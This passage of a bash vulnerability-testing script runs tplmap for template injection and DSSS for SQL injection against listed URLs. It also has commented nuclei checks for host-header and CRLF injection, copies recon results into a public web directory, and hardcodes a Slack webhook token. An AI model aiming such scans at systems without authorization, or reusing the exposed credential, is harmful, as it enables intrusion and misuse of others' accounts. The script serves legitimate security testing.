#---------------------------------------------------------------------------------------------------------------------------------#
# SSTI
printf '%b\n\n\n'; echo -e "$OKGREEN Step10 - SSTI $RESET"
for i in $(cat ./fuzz/fuzz-ssti); do python /root/tools/tplmap/tplmap.py -u $i; done | tee ./automationtesting/ssti-vuln-temp;
cat ./automationtesting/ssti-vuln-temp | egrep -v "\[\+|\!\]" | tee ./automationtesting/ssti-vuln;
rm ./automationtesting/ssti-vuln-temp;


#---------------------------------------------------------------------------------------------------------------------------------#
# SQLI Fuzzing (Error based)
printf '%b\n\n\n'; echo -e "$OKGREEN Step11 - SQLI $RESET"
for i in $(cat ./fuzz/fuzz-sqli); do python3 /root/tools/DSSS/dsss.py -u $i; done | tee ./automationtesting/sqli-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# Copying recon result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Vulnerable Testing Done :)"}' \
https://hooks.slack.com/services/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


#---------------------------------------------------------------------------------------------------------------------------------#
# Software Composition Analysis (SCA) -- dependencies vulnerability checking (based on CVE/advisories)
# -- From download js files ::retire,snyk
# retire --js --jspath ./juicyfiles/download/ --exitwith 13 --outputformat text --outputpath ./automationtesting/sca-retirejs;
# rm -rf node_modules package-lock.json;
#---------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------------#
# Host Header Injection (x-forwarded-host) > Open Redirect
# nuclei -t /root/resource/nuclei-templates/vulnerabilities/x-forwarded-host-injection.yaml -l httpx.out -c 40 -silent \
# -o ./automationtesting/hostheaderinjection-vuln;
#---------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------------#
# CRLF Injection > XSS, Cache-Poisoning
# nuclei -t /root/resource/nuclei-templates/vulnerabilities/crlf-injection.yaml -l httpx.out -c 40 -silent -o ./automationtesting/crlf-vuln;
#---------------------------------------------------------------------------------------------------------------------------------#

}





